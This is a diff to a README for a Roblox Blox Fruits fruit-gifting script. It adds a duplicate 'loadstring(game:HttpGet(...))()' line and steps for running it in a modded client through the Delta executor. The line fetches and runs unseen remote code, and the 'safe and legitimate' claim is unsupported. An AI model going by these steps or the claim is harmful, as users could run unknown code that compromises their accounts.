@@ -17,10 +17,16 @@ A safe and legitimate script for gifting fruits in Blox Fruits.
 loadstring(game:HttpGet("https://raw.githubusercontent.com/PIP400/moonstone-hub/main/moonstone_hub.lua", true))()
 ```
 
-2. Open Delta executor
-3. Paste the loadstring
-4. Click Execute
-5. Click the "Activate Script" button when it appears
+Alternative format (if the above doesn't work):
+```lua
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PIP400/moonstone-hub/main/moonstone_hub.lua", true))()
+```
+
+2. Open your modded Roblox (version 2.670.714)
+3. Open the Delta Executor menu
+4. Paste the loadstring
+5. Click Execute
+6. Click the "Activate Script" button when it appears
 
 ## Configuration
 
